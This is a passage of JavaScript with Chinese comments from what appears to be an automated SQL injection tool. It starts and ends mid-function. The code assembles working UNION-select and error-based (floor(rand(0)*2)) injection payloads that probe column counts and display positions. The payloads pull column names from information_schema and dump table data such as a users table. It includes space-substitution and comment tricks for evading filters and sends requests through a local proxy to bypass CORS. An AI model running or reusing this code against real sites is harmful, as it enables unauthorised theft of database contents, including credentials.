                iframeDoc.open();
                iframeDoc.write(testResult.body);
                iframeDoc.close();
            });
            
            fieldCountResultsList.appendChild(listItem);
            
            // 更新右侧结果显示区域
            document.getElementById('injectionUrl').value = testResult.url;
            // 显示URL解码
            const decodedUrl = customUrlDecode(testResult.url);
            document.getElementById('injectionDecodedUrl').value = decodedUrl;
            // 显示POST参数
            document.getElementById('injectionPostParams').value = testBody || '';
            // 显示POST参数URL解码
            document.getElementById('injectionDecodedPostParams').value = customUrlDecode(testBody || '');
            document.getElementById('injectionStatus').value = testResult.status;
            document.getElementById('injectionTime').value = testResult.time;
            document.getElementById('injectionResponse').value = testResult.body;
            
            // 更新渲染页面
            const iframe = document.getElementById('injectionRenderFrame');
            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            iframeDoc.open();
            iframeDoc.write(testResult.body);
            iframeDoc.close();
            
        } catch (error) {
            // 保存错误结果
            const testResult = {
                url: testUrl,
                status: 'ERROR',
                time: `${Date.now() - startTime}ms`,
                body: error.message,
                success: false
            };
            allResults.push(testResult);
            
            // 添加到结果列表
            const listItem = document.createElement('a');
            listItem.href = '#';
            listItem.className = 'list-group-item list-group-item-action list-group-item-danger';
            // 显示实际使用的payload，包含正确的字段包裹符
            const displayPayload = `?${result.param.key}=${payloadPrefix} order by ${i}${commentSuffix}`;
            listItem.innerHTML = `
                <div class="d-flex justify-content-between align-items-center">
                    <div>
                        <h6 class="mb-1">${displayPayload}</h6>
                        <small>${testResult.status} · ${testResult.time}</small>
                    </div>
                    <span class="badge bg-danger">失败</span>
                </div>
            `;
            
            // 添加点击事件，显示详细结果
            listItem.addEventListener('click', () => {
                document.getElementById('injectionUrl').value = testResult.url;
                // 显示URL解码
                const decodedUrl = customUrlDecode(testResult.url);
                document.getElementById('injectionDecodedUrl').value = decodedUrl;
                // 显示POST参数
                document.getElementById('injectionPostParams').value = testBody || '';
                // 显示POST参数URL解码
                document.getElementById('injectionDecodedPostParams').value = customUrlDecode(testBody || '');
                document.getElementById('injectionStatus').value = testResult.status;
                document.getElementById('injectionTime').value = testResult.time;
                document.getElementById('injectionResponse').value = testResult.body;
                
                // 更新渲染页面
                const iframe = document.getElementById('injectionRenderFrame');
                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                iframeDoc.open();
                iframeDoc.write(testResult.body);
                iframeDoc.close();
            });
            
            fieldCountResultsList.appendChild(listItem);
            
            // 更新右侧结果显示区域
            document.getElementById('injectionUrl').value = testResult.url;
            // 显示URL解码
            const decodedUrl = customUrlDecode(testResult.url);
            document.getElementById('injectionDecodedUrl').value = decodedUrl;
            // 显示POST参数
            document.getElementById('injectionPostParams').value = testBody || '';
            // 显示POST参数URL解码
            document.getElementById('injectionDecodedPostParams').value = customUrlDecode(testBody || '');
            document.getElementById('injectionStatus').value = testResult.status;
            document.getElementById('injectionTime').value = testResult.time;
            document.getElementById('injectionResponse').value = testResult.body;
            
            // 更新渲染页面
            const iframe = document.getElementById('injectionRenderFrame');
            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            iframeDoc.open();
            iframeDoc.write(testResult.body);
            iframeDoc.close();
        }
        
        // 等待500ms避免请求过快
        await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    // 统计成功数量
    const successCount = allResults.filter(result => result.success).length;
    if (successCount > 0) {
        showToast(`成功测试了 ${successCount} 个字段！`, 'success');
    } else {
        showToast('所有字段测试都失败了！', 'error');
    }
}

// 猜测显示位置
async function runDisplayPosition() {
    const displayPosition = parseInt(document.getElementById('displayPosition').value);
    const result = window.currentInjectionResult;
    if (!result) return;
    
    // 清空之前的结果列表
    const displayPositionResultsList = document.getElementById('displayPositionResultsList');
    displayPositionResultsList.innerHTML = '';
    
    // 显示结果列表区域
    const displayPositionResults = document.getElementById('displayPositionResults');
    displayPositionResults.style.display = 'block';
    
    // 创建一个数组来存储所有测试结果
    const allResults = [];
    
    // 构建注入URL
    const selectFields = Array.from({ length: displayPosition }, (_, i) => i + 1).join(',');
    
    // 优先使用当前测试用例的注释变体和空格替代策略
    const commentVariant = result.testCase.commentVariant || 'double_dash_plus';
    // 使用第一个选中的空格替代策略，如果没有选择则使用默认值
    const spaceReplacement = result.testCase.spaceReplacement || 'none';
    
    // 根据注释变体生成注释后缀
    const commentSuffix = commentVariant !== 'no_comment' ? {
        'double_dash': ' -- ',
        'double_dash_plus': ' --+',
        'hash': ' #',
        'multi_line': ' /*注释*/',
        'inline': ' /*!SQL注入测试*/',
        'double_dash_space': ' -- -'
    }[commentVariant] || ' -- ' : '';
    
    // 构建注入payload
    // 根据字段包裹符和注入类型构建正确的payload前缀
    let payloadPrefix = "-1";
    const wrapperType = result.testCase.wrapperType || '无';
    const injectionType = result.testCase.injectionType || 'numeric';
    
    // 根据字段包裹符和注入类型构建正确的payload前缀
    // 优先考虑wrapperType，而不是injectionType
    // 先检查具体的组合包裹符，再检查单一包裹符，最后基于注入类型判断
    if (wrapperType === '单引号+小括号') {
        // 单引号+小括号，添加单引号和右括号闭合
        payloadPrefix = "-1')";
    } else if (wrapperType === '单引号+小括号+小括号') {
        // 单引号+双小括号，添加单引号和两个右括号闭合
        payloadPrefix = "-1'))";
    } else if (wrapperType === '双引号+小括号') {
        // 双引号+小括号，添加双引号和右括号闭合
        payloadPrefix = '-1")';
    } else if (wrapperType === '双引号+小括号+小括号') {
        // 双引号+双小括号，添加双引号和两个右括号闭合
        payloadPrefix = '-1"))';
    } else if (wrapperType === '小括号+小括号') {
        // 双小括号包裹符，添加两个右括号闭合
        payloadPrefix = '-1))';
    } else if (wrapperType === '小括号') {
        // 小括号包裹符，添加右括号闭合
        payloadPrefix = '-1)';
    } else if (wrapperType === '单引号') {
        // 单引号包裹符，添加单引号闭合
        payloadPrefix = "-1'";
    } else if (wrapperType === '双引号') {
        // 双引号包裹符，添加双引号闭合
        payloadPrefix = '-1"';
    } else if (wrapperType === '反引号') {
        // 反引号包裹符，添加反引号闭合
        payloadPrefix = '-1`';
    } else if (wrapperType === '无' && injectionType === 'numeric') {
        // 只有当wrapperType为'无'且injectionType为numeric时，才使用纯数字
        payloadPrefix = '-1';
    } else if (injectionType === 'bracket_single') {
        // 括号型单引号注入
        payloadPrefix = "-1')";
    } else if (injectionType === 'bracket_double') {
        // 括号型双引号注入
        payloadPrefix = '-1")';
    } else if (injectionType.includes('single')) {
        // 基于注入类型的单引号闭合
        payloadPrefix = "-1'";
    } else if (injectionType.includes('double')) {
        // 基于注入类型的双引号闭合
        payloadPrefix = '-1"';
    } else if (injectionType.includes('backtick')) {
        // 基于注入类型的反引号闭合
        payloadPrefix = '-1`';
    } else {
        // 其他情况，使用原始payload的逻辑
        payloadPrefix = "-1";
    }
    const payload = `${payloadPrefix} union select ${selectFields}${commentSuffix}`;
    let testUrl, testBody, displayPayload;
    
    // 显示实际使用的payload，包含正确的字段包裹符和空格替代
    const spaceEncodingStrategies = {
        'none': (text) => text,  // 保持原样（默认）
        'tab': (text) => text.replace(/ /g, '%09'),  // 空格替换为制表符
        'newline': (text) => text.replace(/ /g, '%0A'),  // 空格替换为换行符
        'comment': (text) => text.replace(/ /g, '/**/'),  // 空格替换为SQL注释
        'plus': (text) => text.replace(/ /g, '+')  // 空格替换为+符号
    };
    
    // 根据请求方法构建请求
    if (result.config.requestMethod === 'POST') {
        // POST请求：使用原始URL，在请求体中注入参数
        testUrl = result.url;
        // 构建包含注入payload的POST数据，使用正确的空格编码策略
        testBody = buildPostDataForTest(result.postData, result.param.key, payload, spaceReplacement);
        // 显示payload格式，使用POST格式
        displayPayload = `POST: ${result.param.key}=${spaceEncodingStrategies[spaceReplacement](payload)}`;
    } else {
        // GET请求：在URL中注入参数
        testUrl = buildTestUrl({
            url: result.url,
            param: result.param,
            testCase: { payload, spaceReplacement },
            config: result.config,
            params: result.params
        });
        testBody = undefined;
        displayPayload = `?${result.param.key}=${spaceEncodingStrategies[spaceReplacement](payload)}`;
    }
    
    // 执行请求（通过代理服务器绕过CORS限制）
    const startTime = Date.now();
    try {
        // 使用代理服务器转发请求
        const proxyUrl = `http://localhost:3001/proxy?url=${encodeURIComponent(testUrl)}`;
        const response = await fetch(proxyUrl, {
            method: result.config.requestMethod,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: testBody
        });
        const endTime = Date.now();
        const responseBody = await response.text();
        
        // 保存结果
        const testResult = {
            url: testUrl,
            status: `${response.status} ${response.statusText}`,
            time: `${endTime - startTime}ms`,
            body: responseBody,
            success: true
        };
        allResults.push(testResult);
        
        // 添加到结果列表
        const listItem = document.createElement('a');
        listItem.href = '#';
        listItem.className = 'list-group-item list-group-item-action list-group-item-success';
        listItem.innerHTML = `
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <h6 class="mb-1">${displayPayload}</h6>
                    <small>${testResult.status} · ${testResult.time}</small>
                </div>
                <span class="badge bg-success">成功</span>
            </div>
        `;
        
        // 添加点击事件，显示详细结果
        listItem.addEventListener('click', () => {
            document.getElementById('injectionUrl').value = testResult.url;
            // 显示URL解码
            const decodedUrl = customUrlDecode(testResult.url);
            document.getElementById('injectionDecodedUrl').value = decodedUrl;
            // 显示POST参数
            document.getElementById('injectionPostParams').value = testBody || '';
            // 显示POST参数URL解码
            document.getElementById('injectionDecodedPostParams').value = customUrlDecode(testBody || '');
            document.getElementById('injectionStatus').value = testResult.status;
            document.getElementById('injectionTime').value = testResult.time;
            document.getElementById('injectionResponse').value = testResult.body;
            
            // 更新渲染页面
            const iframe = document.getElementById('injectionRenderFrame');
            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            iframeDoc.open();
            iframeDoc.write(testResult.body);
            iframeDoc.close();
        });
        
        displayPositionResultsList.appendChild(listItem);
        
        // 更新右侧结果显示区域
        document.getElementById('injectionUrl').value = testResult.url;
        // 显示URL解码
        const decodedUrl = customUrlDecode(testResult.url);
        document.getElementById('injectionDecodedUrl').value = decodedUrl;
        // 显示POST参数
        document.getElementById('injectionPostParams').value = testBody || '';
        // 显示POST参数URL解码
        document.getElementById('injectionDecodedPostParams').value = customUrlDecode(testBody || '');
        document.getElementById('injectionStatus').value = testResult.status;
        document.getElementById('injectionTime').value = testResult.time;
        document.getElementById('injectionResponse').value = testResult.body;
        
        // 更新渲染页面
        const iframe = document.getElementById('injectionRenderFrame');
        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
        iframeDoc.open();
        iframeDoc.write(testResult.body);
        iframeDoc.close();
        
        showToast('显示位置测试完成！', 'success');
    } catch (error) {
        // 保存错误结果
        const testResult = {
            url: testUrl,
            status: 'ERROR',
            time: `${Date.now() - startTime}ms`,
            body: error.message,
            success: false
        };
        allResults.push(testResult);
        
        // 添加到结果列表
        const listItem = document.createElement('a');
        listItem.href = '#';
        listItem.className = 'list-group-item list-group-item-action list-group-item-danger';
        listItem.innerHTML = `
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <h6 class="mb-1">${displayPayload}</h6>
                    <small>${testResult.status} · ${testResult.time}</small>
                </div>
                <span class="badge bg-danger">失败</span>
            </div>
        `;
        
        // 添加点击事件，显示详细结果
        listItem.addEventListener('click', () => {
            document.getElementById('injectionUrl').value = testResult.url;
            // 显示URL解码
            const decodedUrl = decodeURIComponent(testResult.url);
            document.getElementById('injectionDecodedUrl').value = decodedUrl;
            document.getElementById('injectionStatus').value = testResult.status;
            document.getElementById('injectionTime').value = testResult.time;
            document.getElementById('injectionResponse').value = testResult.body;
        });
        
        displayPositionResultsList.appendChild(listItem);
        
        // 更新右侧结果显示区域
        document.getElementById('injectionUrl').value = testResult.url;
        // 显示URL解码
        const decodedUrl = decodeURIComponent(testResult.url);
        document.getElementById('injectionDecodedUrl').value = decodedUrl;
        document.getElementById('injectionStatus').value = testResult.status;
        document.getElementById('injectionTime').value = testResult.time;
        document.getElementById('injectionResponse').value = testResult.body;
        
        showToast('显示位置测试失败！', 'error');
    }
}

// 执行注入
async function runInjection() {
    const result = window.currentInjectionResult;
    if (!result) return;
    
    // 清空之前的结果列表
    const injectionResultsList = document.getElementById('injectionResultsList');
    injectionResultsList.innerHTML = '';
    
    // 显示结果列表区域
    const injectionResults = document.getElementById('injectionResults');
    injectionResults.style.display = 'block';
    
    // 创建一个数组来存储所有测试结果
    const allResults = [];
    
    // 获取位置信息
    const positionInfoList = document.getElementById('positionInfoList');
    const positionItems = positionInfoList.querySelectorAll('.position-info-item');
    
    // 构建select字段列表
    const selectFields = {};
    positionItems.forEach(item => {
        const position = parseInt(item.querySelector('select:first-child').value);
        const info = item.querySelector('select:nth-child(2)').value;
        selectFields[position] = info;
    });
    
    // 确定最大位置
    const maxPosition = Math.max(...Object.keys(selectFields).map(Number), 3);
    
    // 构建select语句
    const selectArray = Array.from({ length: maxPosition }, (_, i) => {
        const position = i + 1;
        let field = selectFields[position] || position;
        
        // 处理特殊的信息类型
        if (field === 'get_table_columns') {
            // 获取表字段名
            const positionItem = Array.from(positionItems).find(item => {
                const posSelect = item.querySelector('select:first-child');
                return parseInt(posSelect.value) === position;
            });
            if (positionItem) {
                const tableName = positionItem.querySelector('input:first-child').value || 'users';
                field = `(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='${tableName}')`;
            }
        } else if (field === 'get_table_data') {
            // 获取表字段数据
            const positionItem = Array.from(positionItems).find(item => {
                const posSelect = item.querySelector('select:first-child');
                return parseInt(posSelect.value) === position;
            });
            if (positionItem) {
                const tableName = positionItem.querySelector('input:first-child').value || 'users';
                const columnName = positionItem.querySelector('input:nth-child(2)').value;
                if (columnName) {
                    field = `(SELECT GROUP_CONCAT(${columnName}) FROM ${tableName})`;
                } else {
                    // 如果没有指定字段名，使用表名作为占位符
                    field = `'请指定字段名'`;
                }
            }
        }
        
        return field;
    });
    const selectStatement = selectArray.join(',');
    
    
    // 优先使用当前测试用例的注释变体和空格替代策略
    const commentVariant = result.testCase.commentVariant || 'double_dash_plus';
    // 使用当前测试用例的空格替代策略，如果没有则使用默认值
    const spaceReplacement = result.testCase.spaceReplacement || 'none';
    
    // 根据注释变体生成注释后缀
    const commentSuffix = commentVariant !== 'no_comment' ? {
        'double_dash': ' -- ',
        'double_dash_plus': ' --+',
        'hash': ' #',
        'multi_line': ' /*注释*/',
        'inline': ' /*!SQL注入测试*/',
        'double_dash_space': ' -- -'
    }[commentVariant] || ' -- ' : '';
    
    // 构建注入payload
    // 根据字段包裹符和注入类型构建正确的payload前缀
    let payloadPrefix = "-1";
    const wrapperType = result.testCase.wrapperType || '无';
    const injectionType = result.testCase.injectionType || 'numeric';
    
    // 根据字段包裹符和注入类型构建正确的payload前缀
    // 优先考虑wrapperType，而不是injectionType
    // 先检查具体的组合包裹符，再检查单一包裹符，最后基于注入类型判断
    if (wrapperType === '单引号+小括号') {
        // 单引号+小括号，添加单引号和右括号闭合
        payloadPrefix = "-1')";
    } else if (wrapperType === '单引号+小括号+小括号') {
        // 单引号+双小括号，添加单引号和两个右括号闭合
        payloadPrefix = "-1'))";
    } else if (wrapperType === '双引号+小括号') {
        // 双引号+小括号，添加双引号和右括号闭合
        payloadPrefix = '-1")';
    } else if (wrapperType === '双引号+小括号+小括号') {
        // 双引号+双小括号，添加双引号和两个右括号闭合
        payloadPrefix = '-1"))';
    } else if (wrapperType === '小括号+小括号') {
        // 双小括号包裹符，添加两个右括号闭合
        payloadPrefix = '-1))';
    } else if (wrapperType === '小括号') {
        // 小括号包裹符，添加右括号闭合
        payloadPrefix = '-1)';
    } else if (wrapperType === '单引号') {
        // 单引号包裹符，添加单引号闭合
        payloadPrefix = "-1'";
    } else if (wrapperType === '双引号') {
        // 双引号包裹符，添加双引号闭合
        payloadPrefix = '-1"';
    } else if (wrapperType === '反引号') {
        // 反引号包裹符，添加反引号闭合
        payloadPrefix = '-1`';
    } else if (wrapperType === '无' && injectionType === 'numeric') {
        // 只有当wrapperType为'无'且injectionType为numeric时，才使用纯数字
        payloadPrefix = '-1';
    } else if (injectionType === 'bracket_single') {
        // 括号型单引号注入
        payloadPrefix = "-1')";
    } else if (injectionType === 'bracket_double') {
        // 括号型双引号注入
        payloadPrefix = '-1")';
    } else if (injectionType.includes('single')) {
        // 基于注入类型的单引号闭合
        payloadPrefix = "-1'";
    } else if (injectionType.includes('double')) {
        // 基于注入类型的双引号闭合
        payloadPrefix = '-1"';
    } else if (injectionType.includes('backtick')) {
        // 基于注入类型的反引号闭合
        payloadPrefix = '-1`';
    } else {
        // 其他情况，使用原始payload的逻辑
        payloadPrefix = "-1";
    }
    const payload = `${payloadPrefix} union select ${selectStatement}${commentSuffix}`;
    let testUrl, testBody, displayPayload;
    
    // 显示实际使用的payload，包含正确的字段包裹符和空格替代
    const spaceEncodingStrategies = {
        'none': (text) => text,  // 保持原样（默认）
        'tab': (text) => text.replace(/ /g, '%09'),  // 空格替换为制表符
        'newline': (text) => text.replace(/ /g, '%0A'),  // 空格替换为换行符
        'comment': (text) => text.replace(/ /g, '/**/'),  // 空格替换为SQL注释
        'plus': (text) => text.replace(/ /g, '+')  // 空格替换为+符号
    };
    
    // 根据请求方法构建请求
    if (result.config.requestMethod === 'POST') {
        // POST请求：使用原始URL，在请求体中注入参数
        testUrl = result.url;
        // 构建包含注入payload的POST数据，使用正确的空格编码策略
        testBody = buildPostDataForTest(result.postData, result.param.key, payload, spaceReplacement);
        // 显示payload格式，使用POST格式
        displayPayload = `POST: ${result.param.key}=${spaceEncodingStrategies[spaceReplacement](payload)}`;
    } else {
        // GET请求：在URL中注入参数
        testUrl = buildTestUrl({
            url: result.url,
            param: result.param,
            testCase: { payload, spaceReplacement },
            config: result.config,
            params: result.params
        });
        testBody = undefined;
        displayPayload = `?${result.param.key}=${spaceEncodingStrategies[spaceReplacement](payload)}`;
    }
    
    // 执行请求（通过代理服务器绕过CORS限制）
    const startTime = Date.now();
    try {
        // 使用代理服务器转发请求
        const proxyUrl = `http://localhost:3001/proxy?url=${encodeURIComponent(testUrl)}`;
        const response = await fetch(proxyUrl, {
            method: result.config.requestMethod,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: testBody
        });
        const endTime = Date.now();
        const responseBody = await response.text();
        
        // 保存结果
        const testResult = {
            url: testUrl,
            status: `${response.status} ${response.statusText}`,
            time: `${endTime - startTime}ms`,
            body: responseBody,
            success: true
        };
        allResults.push(testResult);
        
        // 添加到结果列表
        const listItem = document.createElement('a');
        listItem.href = '#';
        listItem.className = 'list-group-item list-group-item-action list-group-item-success';
        listItem.innerHTML = `
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <h6 class="mb-1">${displayPayload}</h6>
                    <small>${testResult.status} · ${testResult.time}</small>
                </div>
                <span class="badge bg-success">成功</span>
            </div>
        `;
        
        // 添加点击事件，显示详细结果
        listItem.addEventListener('click', () => {
            document.getElementById('injectionUrl').value = testResult.url;
            // 显示URL解码
            const decodedUrl = decodeURIComponent(testResult.url);
            document.getElementById('injectionDecodedUrl').value = decodedUrl;
            // 显示POST参数
            document.getElementById('injectionPostParams').value = testBody || '';
            // 显示POST参数URL解码
            document.getElementById('injectionDecodedPostParams').value = customUrlDecode(testBody || '');
            document.getElementById('injectionStatus').value = testResult.status;
            document.getElementById('injectionTime').value = testResult.time;
            document.getElementById('injectionResponse').value = testResult.body;
        });
        
        injectionResultsList.appendChild(listItem);
        
        // 更新右侧结果显示区域
        document.getElementById('injectionUrl').value = testResult.url;
        // 显示URL解码
        const decodedUrl = decodeURIComponent(testResult.url);
        document.getElementById('injectionDecodedUrl').value = decodedUrl;
        // 显示POST参数
        document.getElementById('injectionPostParams').value = testBody || '';
        // 显示POST参数URL解码
        document.getElementById('injectionDecodedPostParams').value = customUrlDecode(testBody || '');
        document.getElementById('injectionStatus').value = testResult.status;
        document.getElementById('injectionTime').value = testResult.time;
        document.getElementById('injectionResponse').value = testResult.body;
        
        // 更新渲染页面
        const iframe = document.getElementById('injectionRenderFrame');
        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
        iframeDoc.open();
        iframeDoc.write(testResult.body);
        iframeDoc.close();
        
        showToast('注入执行完成！', 'success');
    } catch (error) {
        // 保存错误结果
        const testResult = {
            url: testUrl,
            status: 'ERROR',
            time: `${Date.now() - startTime}ms`,
            body: error.message,
            success: false
        };
        allResults.push(testResult);
        
        // 添加到结果列表
        const listItem = document.createElement('a');
        listItem.href = '#';
        listItem.className = 'list-group-item list-group-item-action list-group-item-danger';
        listItem.innerHTML = `
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <h6 class="mb-1">${displayPayload}</h6>
                    <small>${testResult.status} · ${testResult.time}</small>
                </div>
                <span class="badge bg-danger">失败</span>
            </div>
        `;
        
        // 添加点击事件，显示详细结果
        listItem.addEventListener('click', () => {
            document.getElementById('injectionUrl').value = testResult.url;
            // 显示URL解码
            const decodedUrl = decodeURIComponent(testResult.url);
            document.getElementById('injectionDecodedUrl').value = decodedUrl;
            // 显示POST参数
            document.getElementById('injectionPostParams').value = testBody || '';
            // 显示POST参数URL解码
            document.getElementById('injectionDecodedPostParams').value = customUrlDecode(testBody || '');
            document.getElementById('injectionStatus').value = testResult.status;
            document.getElementById('injectionTime').value = testResult.time;
            document.getElementById('injectionResponse').value = testResult.body;
        });
        
        injectionResultsList.appendChild(listItem);
        
        // 更新右侧结果显示区域
        document.getElementById('injectionUrl').value = testResult.url;
        // 显示URL解码
        const decodedUrl = decodeURIComponent(testResult.url);
        document.getElementById('injectionDecodedUrl').value = decodedUrl;
        // 显示POST参数
        document.getElementById('injectionPostParams').value = testBody || '';
        // 显示POST参数URL解码
        document.getElementById('injectionDecodedPostParams').value = customUrlDecode(testBody || '');
        document.getElementById('injectionStatus').value = testResult.status;
        document.getElementById('injectionTime').value = testResult.time;
        document.getElementById('injectionResponse').value = testResult.body;
        
        showToast('注入执行失败！', 'error');
    }
}

// 双查询注入函数
async function runErrorInjection() {
    const result = window.currentInjectionResult;
    if (!result) return;
    
    // 清空之前的结果列表
    const injectionResultsList = document.getElementById('injectionResultsList');
    injectionResultsList.innerHTML = '';
    
    // 显示结果列表区域
    const injectionResults = document.getElementById('injectionResults');
    injectionResults.style.display = 'block';
    
    // 保存原始的位置信息
    const positionInfoList = document.getElementById('positionInfoList');
    const positionItems = positionInfoList.querySelectorAll('.position-info-item');
    
    // 遍历所有位置项，获取要注入的信息
    let queryStatement = '@@version_compile_os'; // 默认查询操作系统
    
    positionItems.forEach(item => {
        const info = item.querySelector('select:nth-child(2)').value;
        
        if (info === 'get_table_columns') {
            // 获取表字段名
            const tableName = item.querySelector('input:first-child').value || 'users';
            queryStatement = `(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='${tableName}')`;
        } else if (info === 'get_table_data') {
            // 获取表字段数据
            const tableName = item.querySelector('input:first-child').value || 'users';
            const columnName = item.querySelector('input:nth-child(2)').value || 'username';
            queryStatement = `(SELECT GROUP_CONCAT(${columnName}) FROM ${tableName})`;
        } else if (info !== 'get_table_columns' && info !== 'get_table_data') {
            // 直接使用选择的SQL函数
            queryStatement = info;
        }
    });
    
    // 优先使用当前测试用例的注释变体和空格替代策略
    const commentVariant = result.testCase.commentVariant || 'double_dash_plus';
    // 使用当前测试用例的空格替代策略，如果没有则使用默认值
    const spaceReplacement = result.testCase.spaceReplacement || 'none';
    
    // 根据注释变体生成注释后缀
    const commentSuffix = commentVariant !== 'no_comment' ? {
        'double_dash': ' -- ',
        'double_dash_plus': ' --+',
        'hash': ' #',
        'multi_line': ' /*注释*/',
        'inline': ' /*!SQL注入测试*/',
        'double_dash_space': ' -- -'
    }[commentVariant] || ' -- ' : '';
    
    // 构建注入payload
    // 根据字段包裹符和注入类型构建正确的payload前缀
    let payloadPrefix = "-1";
    const wrapperType = result.testCase.wrapperType || '无';
    const injectionType = result.testCase.injectionType || 'numeric';
    
    // 根据字段包裹符和注入类型构建正确的payload前缀
    // 优先考虑wrapperType，而不是injectionType
    // 先检查具体的组合包裹符，再检查单一包裹符，最后基于注入类型判断
    if (wrapperType === '单引号+小括号') {
        // 单引号+小括号，添加单引号和右括号闭合
        payloadPrefix = "-1')";
    } else if (wrapperType === '单引号+小括号+小括号') {
        // 单引号+双小括号，添加单引号和两个右括号闭合
        payloadPrefix = "-1'))";
    } else if (wrapperType === '双引号+小括号') {
        // 双引号+小括号，添加双引号和右括号闭合
        payloadPrefix = '-1")';
    } else if (wrapperType === '双引号+小括号+小括号') {
        // 双引号+双小括号，添加双引号和两个右括号闭合
        payloadPrefix = '-1"))';
    } else if (wrapperType === '小括号+小括号') {
        // 双小括号包裹符，添加两个右括号闭合
        payloadPrefix = '-1))';
    } else if (wrapperType === '小括号') {
        // 小括号包裹符，添加右括号闭合
        payloadPrefix = '-1)';
    } else if (wrapperType === '单引号') {
        // 单引号包裹符，添加单引号闭合
        payloadPrefix = "-1'";
    } else if (wrapperType === '双引号') {
        // 双引号包裹符，添加双引号闭合
        payloadPrefix = '-1"';
    } else if (wrapperType === '反引号') {
        // 反引号包裹符，添加反引号闭合
        payloadPrefix = '-1`';
    } else if (wrapperType === '无' && injectionType === 'numeric') {
        // 只有当wrapperType为'无'且injectionType为numeric时，才使用纯数字
        payloadPrefix = '-1';
    } else if (injectionType === 'bracket_single') {
        // 括号型单引号注入
        payloadPrefix = "-1')";
    } else if (injectionType === 'bracket_double') {
        // 括号型双引号注入
        payloadPrefix = '-1")';
    } else if (injectionType.includes('single')) {
        // 基于注入类型的单引号闭合
        payloadPrefix = "-1'";
    } else if (injectionType.includes('double')) {
        // 基于注入类型的双引号闭合
        payloadPrefix = '-1"';
    } else if (injectionType.includes('backtick')) {
        // 基于注入类型的反引号闭合
        payloadPrefix = '-1`';
    } else {
        // 其他情况，使用原始payload的逻辑
        payloadPrefix = "-1";
    }
    
    // 构建双查询注入payload，使用floor(rand(0)*2)方法
    const payload = `${payloadPrefix} union select 1, count(*), concat(${queryStatement}, '---', floor(rand(0)*2)) as a from information_schema.tables group by a${commentSuffix}`;
    let testUrl, testBody, displayPayload;
    
    // 显示实际使用的payload，包含正确的字段包裹符和空格替代
    const spaceEncodingStrategies = {
        'none': (text) => text,  // 保持原样（默认）
        'tab': (text) => text.replace(/ /g, '%09'),  // 空格替换为制表符
        'newline': (text) => text.replace(/ /g, '%0A'),  // 空格替换为换行符
        'comment': (text) => text.replace(/ /g, '/**/'),  // 空格替换为注释
        'plus': (text) => text.replace(/ /g, '+')  // 加号替代策略
    };
    
    // 根据空格替代策略处理显示的payload
    const encodingStrategy = spaceEncodingStrategies[spaceReplacement] || spaceEncodingStrategies['none'];
    const encodedPayload = encodingStrategy(payload);
    
    // 根据请求方法构建请求
    if (result.config.requestMethod === 'POST') {
        // POST请求：使用原始URL，在请求体中注入参数
        testUrl = result.url;
        // 构建包含注入payload的POST数据，使用正确的空格编码策略
        testBody = buildPostDataForTest(result.postData, result.param.key, payload, spaceReplacement);
        // 显示payload格式，使用POST格式
        displayPayload = `POST: ${result.param.key}=${encodedPayload}`;
    } else {
        // GET请求：在URL中注入参数
        testUrl = buildTestUrl({
            url: result.url,
            param: result.param,
            testCase: { payload, spaceReplacement },
            config: result.config,
            params: result.params
        });
        testBody = undefined;
        displayPayload = encodedPayload;
    }
    
    // 开始执行请求
    const startTime = Date.now();
    try {
        // 使用代理服务器转发请求
        const proxyUrl = `http://localhost:3001/proxy?url=${encodeURIComponent(testUrl)}`;
        const response = await fetch(proxyUrl, {
            method: result.config.requestMethod,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: testBody,
            mode: 'cors',
            credentials: 'include'
        });
        
        const status = response.status;
        const time = `${Date.now() - startTime}ms`;
        const body = await response.text();
        
        // 保存结果
        const testResult = {
            url: testUrl,
            status: status,
            time: time,
            body: body,
            success: true
        };
        
        // 添加到结果列表
        const listItem = document.createElement('a');
        listItem.href = '#';
        listItem.className = 'list-group-item list-group-item-action list-group-item-success';
        listItem.innerHTML = `
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <h6 class="mb-1">${displayPayload}</h6>
                    <small>${testResult.status} · ${testResult.time}</small>
                </div>
                <span class="badge bg-success">成功</span>
            </div>
        `;
        
        // 添加点击事件，显示详细结果
        listItem.addEventListener('click', () => {
            document.getElementById('injectionUrl').value = testResult.url;
            // 显示URL解码
            const decodedUrl = decodeURIComponent(testResult.url);
            document.getElementById('injectionDecodedUrl').value = decodedUrl;
            // 显示POST参数
            document.getElementById('injectionPostParams').value = testBody || '';
            // 显示POST参数URL解码
            document.getElementById('injectionDecodedPostParams').value = customUrlDecode(testBody || '');
            document.getElementById('injectionStatus').value = testResult.status;
            document.getElementById('injectionTime').value = testResult.time;
            document.getElementById('injectionResponse').value = testResult.body;
        });
        
        injectionResultsList.appendChild(listItem);
        
        // 更新右侧结果显示区域
        document.getElementById('injectionUrl').value = testResult.url;
        // 显示URL解码
        const decodedUrl = decodeURIComponent(testResult.url);
        document.getElementById('injectionDecodedUrl').value = decodedUrl;
        // 显示POST参数
        document.getElementById('injectionPostParams').value = testBody || '';
        // 显示POST参数URL解码
        document.getElementById('injectionDecodedPostParams').value = customUrlDecode(testBody || '');
        document.getElementById('injectionStatus').value = testResult.status;
        document.getElementById('injectionTime').value = testResult.time;
        document.getElementById('injectionResponse').value = testResult.body;
        
        // 更新渲染页面
        const iframe = document.getElementById('injectionRenderFrame');
        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
        iframeDoc.open();
        iframeDoc.write(testResult.body);
        iframeDoc.close();
        
        showToast('报错注入执行完成！', 'success');
    } catch (error) {
